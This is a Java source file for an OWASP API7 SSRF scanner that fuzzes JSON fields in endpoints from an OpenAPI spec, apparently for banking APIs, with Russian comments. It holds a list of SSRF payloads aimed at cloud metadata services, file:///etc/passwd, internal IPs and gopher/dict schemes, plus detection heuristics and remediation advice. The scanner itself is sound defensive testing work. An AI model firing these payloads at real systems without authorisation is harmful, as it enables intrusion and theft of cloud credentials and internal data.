package scanners.owasp;

import scanners.SecurityScanner;
import core.ScanConfig;
import core.Vulnerability;
import core.ApiClient;
import core.HttpApiClient;
import io.swagger.v3.oas.models.OpenAPI;
import io.swagger.v3.oas.models.PathItem;
import io.swagger.v3.oas.models.Operation;
import io.swagger.v3.oas.models.parameters.Parameter;
import io.swagger.v3.oas.models.media.Schema;
import io.swagger.v3.oas.models.media.Content;
import io.swagger.v3.oas.models.media.MediaType;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.util.*;

public class API7_SSRFScanner implements SecurityScanner {

    private static final Set<String> COMMON_SSRF_FIELDS = new HashSet<>(Arrays.asList(
            "webhook_url", "callback_url", "notification_url", "redirect_url",
            "api_url", "endpoint", "url", "target", "server", "host",
            "image_url", "avatar_url", "logo_url", "file_url", "resource_url"
    ));

    private static final List<String> SSRF_PAYLOADS = Arrays.asList(
            "http://127.0.0.1:8080/health",
            "http://localhost:8080/metrics",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://internal.api.local/secret",
            "http://192.168.1.1/admin",
            "http://10.0.0.1/config",
            "file:///etc/passwd",
            "gopher://localhost:8080/",
            "dict://localhost:8080/"
    );

    private ObjectMapper mapper = new ObjectMapper();
    private ScanConfig config;

    @Override
    public String getName() {
        return "OWASP API7: Server Side Request Forgery (SSRF) Scanner";
    }

    @Override
    public List<Vulnerability> scan(Object openApiObj, ScanConfig config, ApiClient apiClient) {
        this.config = config;
        System.out.println("(API-7) Запуск SSRF сканирования с авторизацией...");
        List<Vulnerability> vulnerabilities = new ArrayList<>();

        if (!(openApiObj instanceof OpenAPI)) {
            System.err.println("(API-7) Ошибка: входной объект не является OpenAPI");
            return vulnerabilities;
        }

        OpenAPI openAPI = (OpenAPI) openApiObj;

        if (openAPI.getPaths() == null) return vulnerabilities;

        // Получаем токены из конфигурации как в API6
        Map<String, String> tokens = config.getUserTokens();
        if (tokens == null || tokens.isEmpty()) {
            System.err.println("(API-7) Ошибка: токены не найдены в конфигурации");
            return vulnerabilities;
        }

        System.out.println("(API-7) Используем " + tokens.size() + " токенов из конфигурации");

        // Используем банковский токен для максимальных привилегий
        String token = tokens.get("bank");
        if (token == null) {
            token = tokens.get("default");
            if (token == null && !tokens.isEmpty()) {
                token = tokens.values().iterator().next();
            }
        }

        if (token == null) {
            System.err.println("(API-7) ОШИБКА: не удалось получить токен для сканирования");
            return vulnerabilities;
        }

        System.out.println("(API-7) Используется токен для SSRF сканирования");

        for (String path : openAPI.getPaths().keySet()) {
            PathItem pathItem = openAPI.getPaths().get(path);

            // Проверяем все методы, а не только POST
            for (Operation op : getOperations(pathItem)) {
                if (hasJsonRequestBody(op)) {
                    String endpoint = smartPathReplace(path);
                    if (endpoint == null) continue;

                    System.out.println("(API-7) Тестируем эндпоинт " + op + ": " + endpoint);

                    // 1. Blind SSRF: добавляем новые URL-поля с авторизацией
                    for (String field : COMMON_SSRF_FIELDS) {
                        for (String payload : SSRF_PAYLOADS) {
                            try {
                                Map<String, Object> body = new HashMap<>();
                                body.put(field, payload);
                                // Добавляем минимальный набор полей для валидности запроса
                                body.put("test", "value");
                                if (field.equals("amount") || field.equals("value")) {
                                    body.put(field, 100.0); // для числовых полей
                                }

                                String jsonBody = toJson(body);
                                Map<String, String> headers = createAuthHeaders(token);

                                Object resp = apiClient.executeRequest("POST", config.getTargetBaseUrl() + endpoint, jsonBody, headers);

                                if (resp instanceof HttpApiClient.ApiResponse) {
                                    HttpApiClient.ApiResponse apiResp = (HttpApiClient.ApiResponse) resp;
                                    System.out.println("(API-7) Ответ от " + endpoint + ": " + apiResp.getStatusCode());

                                    if (isSSRFResponse(apiResp, payload)) {
                                        vulnerabilities.add(createVuln(endpoint, field, payload, apiResp));
                                        System.out.println("(API-7) НАЙДЕНА SSRF в " + endpoint + " через " + field);
                                    }
                                }
                            } catch (Exception ex) {
                                System.err.println("(API-7) Ошибка при тестировании " + field + ": " + ex.getMessage());
                            }
                        }
                    }

                    // 2. Fuzz существующих строковых полей с авторизацией
                    fuzzExistingStringFields(op, endpoint, config, apiClient, vulnerabilities, token);
                }
            }
        }

        System.out.println("(API-7) Сканирование завершено. Найдено уязвимостей: " + vulnerabilities.size());
        return vulnerabilities;
    }

    private List<Operation> getOperations(PathItem pathItem) {
        List<Operation> operations = new ArrayList<>();
        if (pathItem.getGet() != null) operations.add(pathItem.getGet());
        if (pathItem.getPost() != null) operations.add(pathItem.getPost());
        if (pathItem.getPut() != null) operations.add(pathItem.getPut());
        if (pathItem.getPatch() != null) operations.add(pathItem.getPatch());
        if (pathItem.getDelete() != null) operations.add(pathItem.getDelete());
        return operations;
    }

    private boolean hasJsonRequestBody(Operation op) {
        if (op.getRequestBody() == null || op.getRequestBody().getContent() == null) return false;
        Content content = op.getRequestBody().getContent();
        return content.containsKey("application/json") || content.containsKey("application/*+json");
    }

    private void fuzzExistingStringFields(Operation op, String endpoint, ScanConfig config,
                                          ApiClient apiClient, List<Vulnerability> vulns, String token) {
        MediaType mediaType = op.getRequestBody().getContent().get("application/json");
        if (mediaType == null || mediaType.getSchema() == null) return;

        Schema<?> schema = mediaType.getSchema();
        List<String> stringFields = extractStringFields(schema, "");

        System.out.println("(API-7) Найдено строковых полей для фаззинга: " + stringFields.size());

        for (String fieldPath : stringFields) {
            for (String payload : SSRF_PAYLOADS) {
                try {
                    Map<String, Object> body = buildNestedObject(fieldPath, payload);
                    String jsonBody = toJson(body);
                    Map<String, String> headers = createAuthHeaders(token);

                    Object resp = apiClient.executeRequest("POST", config.getTargetBaseUrl() + endpoint, jsonBody, headers);

                    if (resp instanceof HttpApiClient.ApiResponse) {
                        HttpApiClient.ApiResponse apiResp = (HttpApiClient.ApiResponse) resp;
                        if (isSSRFResponse(apiResp, payload)) {
                            vulns.add(createVuln(endpoint, fieldPath, payload, apiResp));
                            System.out.println("(API-7) НАЙДЕНА SSRF в " + endpoint + " через существующее поле: " + fieldPath);
                        }
                    }
                } catch (Exception ex) {
                    // ignore
                }
            }
        }
    }

    private Map<String, Object> buildNestedObject(String fieldPath, String value) {
        Map<String, Object> result = new HashMap<>();
        String[] parts = fieldPath.split("\\.");

        if (parts.length == 1) {
            result.put(parts[0], value);
        } else {
            Map<String, Object> current = result;
            for (int i = 0; i < parts.length - 1; i++) {
                Map<String, Object> nested = new HashMap<>();
                current.put(parts[i], nested);
                current = nested;
            }
            current.put(parts[parts.length - 1], value);
        }

        // Добавляем обязательные поля для валидности запроса
        result.put("test", "value");
        return result;
    }

    private List<String> extractStringFields(Schema<?> schema, String prefix) {
        List<String> fields = new ArrayList<>();
        if (schema.getProperties() == null) return fields;

        for (String propName : schema.getProperties().keySet()) {
            Schema<?> propSchema = (Schema<?>) schema.getProperties().get(propName);
            String fullName = prefix.isEmpty() ? propName : prefix + "." + propName;

            if ("string".equals(propSchema.getType())) {
                // Проверяем формат строки - особенно интересуют URI, URL, hostname
                String format = propSchema.getFormat();
                if (format == null || "uri".equals(format) || "url".equals(format) ||
                        "hostname".equals(format) || "email".equals(format)) {
                    fields.add(fullName);
                } else if (propSchema.getName() != null &&
                        (propSchema.getName().toLowerCase().contains("url") ||
                                propSchema.getName().toLowerCase().contains("uri") ||
                                propSchema.getName().toLowerCase().contains("host") ||
                                propSchema.getName().toLowerCase().contains("endpoint"))) {
                    fields.add(fullName);
                }
            } else if ("object".equals(propSchema.getType()) && propSchema.getProperties() != null) {
                fields.addAll(extractStringFields(propSchema, fullName));
            } else if ("array".equals(propSchema.getType()) && propSchema.getItems() != null) {
                // Рекурсивно обрабатываем элементы массива
                Schema<?> itemsSchema = (Schema<?>) propSchema.getItems();
                if ("string".equals(itemsSchema.getType())) {
                    fields.add(fullName + "[]");
                }
            }
        }
        return fields;
    }

    private String smartPathReplace(String path) {
        return path.replaceAll("\\{[^}]+\\}", "test-id");
    }

    private Map<String, String> createAuthHeaders(String token) {
        Map<String, String> headers = new HashMap<>();
        headers.put("Content-Type", "application/json");
        headers.put("Authorization", "Bearer " + token);
        headers.put("User-Agent", "SSRF-Scanner/1.0");
        headers.put("Accept", "application/json");

        // Добавляем банковские заголовки как в API6 - используем bankId из конфигурации
        String bankId = config.getBankId();
        if (bankId != null && !bankId.trim().isEmpty()) {
            headers.put("X-Requesting-Bank", bankId);
            System.out.println("(API-7) Добавлен заголовок X-Requesting-Bank: " + bankId);
        } else {
            System.out.println("(API-7) BankId не указан в конфигурации, заголовок X-Requesting-Bank не добавлен");
        }

        return headers;
    }

    private String toJson(Map<String, Object> map) {
        try {
            return mapper.writeValueAsString(map);
        } catch (Exception jsonException) {
            // Fallback to manual JSON creation
            StringBuilder sb = new StringBuilder("{");
            boolean first = true;
            for (Map.Entry<String, Object> entry : map.entrySet()) {
                if (!first) sb.append(",");
                sb.append("\"").append(entry.getKey()).append("\":");
                if (entry.getValue() instanceof String) {
                    sb.append("\"").append(entry.getValue()).append("\"");
                } else {
                    sb.append(entry.getValue());
                }
                first = false;
            }
            sb.append("}");
            return sb.toString();
        }
    }

    private boolean isSSRFResponse(HttpApiClient.ApiResponse resp, String payload) {
        int status = resp.getStatusCode();
        String body = resp.getBody() != null ? resp.getBody().toLowerCase() : "";
        Map<String, List<String>> headers = resp.getHeaders();

        // 1. Прямые свидетельства в теле ответа
        if (body.contains("root:") || body.contains("passwd") || body.contains("ami-") ||
                body.contains("instance-id") || body.contains("metadata") ||
                body.contains("169.254.169.254") || body.contains("localhost") ||
                body.contains("127.0.0.1") || body.contains("internal")) {
            return true;
        }

        // 2. Ошибки соединения с внутренними ресурсами
        if (status >= 500 && (body.contains("connection") || body.contains("timeout") ||
                body.contains("refused") || body.contains("internal error") ||
                body.contains("service unavailable"))) {
            return true;
        }

        // 3. Успешный ответ при запросе к внутреннему URL
        if (status == 200 && (payload.contains("127.0.0.1") || payload.contains("localhost") ||
                payload.contains("169.254.169.254") || payload.contains("192.168.") ||
                payload.contains("10.0."))) {
            // Дополнительная проверка: ответ содержит данные, характерные для внутренних сервисов
            if (body.contains("health") || body.contains("metric") || body.contains("status") ||
                    body.length() < 1000) { // Короткие ответы часто характерны для internal endpoints
                return true;
            }
        }

        // 4. Редиректы на внутренние ресурсы
        if ((status == 301 || status == 302 || status == 307) && headers != null) {
            List<String> locationHeaders = headers.get("location");
            if (locationHeaders != null) {
                for (String location : locationHeaders) {
                    if (location.contains("127.0.0.1") || location.contains("localhost") ||
                            location.contains("169.254.169.254") || location.contains("internal")) {
                        return true;
                    }
                }
            }
        }

        // 5. Разница в поведении между внешними и внутренними запросами
        if (status == 200 && body.length() > 0) {
            // Если payload содержит внутренний адрес, а ответ не похож на обычную ошибку
            if ((payload.contains("127.0.0.1") || payload.contains("localhost")) &&
                    !body.contains("error") && !body.contains("invalid") &&
                    !body.contains("not found")) {
                return true;
            }
        }

        return false;
    }

    private Vulnerability createVuln(String endpoint, String param, String payload, HttpApiClient.ApiResponse resp) {
        Vulnerability v = new Vulnerability();
        v.setTitle("OWASP API7: SSRF через " + param);
        v.setDescription("Эндпоинт " + endpoint + " уязвим к SSRF через параметр/поле '" + param + "'. Payload: " + payload);
        v.setSeverity(Vulnerability.Severity.HIGH);
        v.setCategory(Vulnerability.Category.OWASP_API7_SSRF);
        v.setEndpoint(endpoint);
        v.setMethod("POST");
        v.setParameter(param);
        v.setEvidence("Payload: " + payload +
                "\nStatus: " + resp.getStatusCode() +
                "\nResponse: " + (resp.getBody() != null ?
                resp.getBody().substring(0, Math.min(500, resp.getBody().length())) : "empty"));
        v.setStatusCode(resp.getStatusCode());
        v.setRecommendations(Arrays.asList(
                "Валидируйте все внешние URL по белому списку разрешенных доменов",
                "Блокируйте доступ к внутренним IP-адресам (127.0.0.1, localhost, 169.254.169.254, 10.x.x.x, 192.168.x.x)",
                "Запретите опасные схемы: file://, gopher://, dict://",
                "Используйте изолированный outbound proxy для всех исходящих запросов",
                "Внедрите проверку DNS resolution для предотвращения обхода через DNS rebinding",
                "Ограничьте время выполнения внешних запросов",
                "Используйте URL parsing библиотеки для корректного разбора URL",
                "Реализуйте механизм подписи исходящих запросов"
        ));
        return v;
    }
}